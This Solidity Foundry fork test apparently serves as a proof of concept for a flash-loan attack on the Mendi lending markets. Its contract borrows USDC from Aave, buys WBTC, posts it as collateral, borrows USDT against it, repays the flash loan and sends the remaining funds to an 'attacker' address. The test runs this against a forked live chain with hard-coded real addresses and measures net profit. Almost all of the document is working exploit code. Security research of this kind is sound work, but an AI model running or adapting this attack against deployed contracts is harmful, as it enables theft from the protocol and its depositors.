// SPDX-License-Identifier: BSD-3-Clause
pragma solidity ^0.8.10;

import { Test, console2 } from "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function mint(uint256 amount) external returns (uint256);
    function borrow(uint256 amount) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
}

interface IAavePoolLike {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ISwapRouter02Like {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract MendiCandidateFlashBorrower {
    address public immutable attacker;
    IAavePoolLike public immutable aavePool;
    ISwapRouter02Like public immutable router;
    IERC20Like public immutable flashToken;
    IERC20Like public immutable collateralToken;
    IERC20Like public immutable debtToken;
    ICTokenLike public immutable collateralCToken;
    ICTokenLike public immutable debtCToken;
    uint256 public immutable flashAmount;
    uint256 public immutable borrowAmount;
    uint24 public immutable buyFee;
    uint24 public immutable exitFee;

    uint256 public lastCollateralReceived;
    uint256 public lastDebtReceived;
    uint256 public lastFlashRepayment;

    event CandidateExecuted(
        uint256 collateralReceived,
        uint256 debtReceived,
        uint256 flashRepayment,
        uint256 residualCollateralCTokens,
        uint256 residualDebt
    );

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    constructor(
        address attacker_,
        address aavePool_,
        address router_,
        address flashToken_,
        address collateralCToken_,
        address debtCToken_,
        uint256 flashAmount_,
        uint256 borrowAmount_,
        uint24 buyFee_,
        uint24 exitFee_
    ) {
        attacker = attacker_;
        aavePool = IAavePoolLike(aavePool_);
        router = ISwapRouter02Like(router_);
        flashToken = IERC20Like(flashToken_);
        collateralCToken = ICTokenLike(collateralCToken_);
        debtCToken = ICTokenLike(debtCToken_);
        collateralToken = IERC20Like(ICTokenLike(collateralCToken_).underlying());
        debtToken = IERC20Like(ICTokenLike(debtCToken_).underlying());
        flashAmount = flashAmount_;
        borrowAmount = borrowAmount_;
        buyFee = buyFee_;
        exitFee = exitFee_;
        require(collateralCToken.comptroller() == debtCToken.comptroller(), "comptroller mismatch");
    }

    function execute() external onlyAttacker {
        aavePool.flashLoanSimple(address(this), address(flashToken), flashAmount, "", 0);
        _sweep(flashToken);
        _sweep(debtToken);
        _sweep(collateralToken);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(aavePool), "wrong Aave caller");
        require(initiator == address(this), "wrong flash initiator");
        require(asset == address(flashToken) && amount == flashAmount, "unexpected flash asset/amount");

        _swap(address(flashToken), address(collateralToken), flashAmount, buyFee);
        uint256 collateralReceived = collateralToken.balanceOf(address(this));
        require(collateralReceived != 0, "no collateral received");

        address[] memory markets = new address[](1);
        markets[0] = address(collateralCToken);
        uint256[] memory enterResults = IComptrollerLike(collateralCToken.comptroller()).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter market failed");
        require(collateralToken.approve(address(collateralCToken), collateralReceived), "mint approval failed");
        require(collateralCToken.mint(collateralReceived) == 0, "collateral mint failed");
        require(debtCToken.borrow(borrowAmount) == 0, "debt borrow failed");

        uint256 debtReceived = debtToken.balanceOf(address(this));
        if (address(debtToken) != address(flashToken)) {
            _swap(address(debtToken), address(flashToken), debtReceived, exitFee);
        }

        uint256 repayment = amount + premium;
        require(flashToken.balanceOf(address(this)) >= repayment, "flash repayment shortfall");
        require(flashToken.approve(address(aavePool), repayment), "Aave repay approval failed");
        lastCollateralReceived = collateralReceived;
        lastDebtReceived = debtReceived;
        lastFlashRepayment = repayment;
        emit CandidateExecuted(
            collateralReceived,
            debtReceived,
            repayment,
            collateralCToken.balanceOf(address(this)),
            debtCToken.borrowBalanceStored(address(this))
        );
        return true;
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn, uint24 fee) internal {
        require(IERC20Like(tokenIn).approve(address(router), amountIn), "swap approval failed");
        ISwapRouter02Like.ExactInputSingleParams memory params = ISwapRouter02Like.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp + 3600,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        router.exactInputSingle(params);
    }

    function _sweep(IERC20Like token) internal {
        uint256 balance = token.balanceOf(address(this));
        if (balance != 0) require(token.transfer(attacker, balance), "sweep failed");
    }
}

contract MendiStaleCollateralForkTest is Test {
    address internal constant AAVE_POOL = 0xc47b8C00b0f69a36fa203Ffeac0334874574a8Ac;
    address internal constant SWAP_ROUTER = 0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a;
    address internal constant USDC = 0x176211869cA2b568f2A7D4EE941E073a821EE1ff;
    address internal constant ME_WBTC = 0x9be5e24F05bBAfC28Da814bD59284878b388a40f;
    address internal constant ME_USDT = 0xf669C3C03D9fdF4339e19214A749E52616300E89;

    function testForkCandidate_flashMintBorrowExitRepayAndMeasureNet() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 blockNumber = vm.envUint("BLOCK");
        vm.createSelectFork(rpc, blockNumber);

        address flashToken = vm.envOr("FLASH_TOKEN", USDC);
        address collateralCToken = vm.envOr("COLLATERAL_CTOKEN", ME_WBTC);
        address debtCToken = vm.envOr("DEBT_CTOKEN", ME_USDT);
        uint256 flashAmount = vm.envOr("FLASH_AMOUNT", uint256(1_000e6));
        uint256 borrowAmount = vm.envOr("BORROW_AMOUNT", uint256(100e6));
        uint256 buyFeeUint = vm.envOr("BUY_FEE", uint256(3000));
        uint256 exitFeeUint = vm.envOr("EXIT_FEE", uint256(500));
        require(buyFeeUint <= type(uint24).max && exitFeeUint <= type(uint24).max, "invalid fee tier");
        bool requireProfit = vm.envOr("REQUIRE_PROFIT", false);
        bool expectRevert = vm.envOr("EXPECT_REVERT", false);
        int256 minimumFlashNet = vm.envOr("MIN_FLASH_NET", int256(0));

        address debtToken = ICTokenLike(debtCToken).underlying();
        MendiCandidateFlashBorrower borrower = new MendiCandidateFlashBorrower(
            address(this),
            AAVE_POOL,
            SWAP_ROUTER,
            flashToken,
            collateralCToken,
            debtCToken,
            flashAmount,
            borrowAmount,
            uint24(buyFeeUint),
            uint24(exitFeeUint)
        );

        uint256 initialFlash = IERC20Like(flashToken).balanceOf(address(this));
        uint256 initialDebt = IERC20Like(debtToken).balanceOf(address(this));
        if (expectRevert) vm.expectRevert();
        borrower.execute();
        if (expectRevert) {
            console2.log("expected revert observed; no profit claim");
            return;
        }
        uint256 finalFlash = IERC20Like(flashToken).balanceOf(address(this));
        uint256 finalDebt = IERC20Like(debtToken).balanceOf(address(this));
        int256 flashNet = int256(finalFlash) - int256(initialFlash);
        int256 debtNet = int256(finalDebt) - int256(initialDebt);

        console2.log("flash token liquid net before gas", flashNet);
        console2.log("debt token liquid net before gas", debtNet);
        console2.log("collateral received", borrower.lastCollateralReceived());
        console2.log("debt received", borrower.lastDebtReceived());
        console2.log("Aave principal plus premium repaid", borrower.lastFlashRepayment());
        console2.log("residual collateral cTokens", ICTokenLike(collateralCToken).balanceOf(address(borrower)));
        console2.log("residual borrow balance", ICTokenLike(debtCToken).borrowBalanceStored(address(borrower)));
        console2.log("residual collateral/debt are not counted as liquid profit");
        if (requireProfit) assertTrue(flashNet > minimumFlashNet, "candidate did not exceed minimum liquid flash-token delta");
    }
}
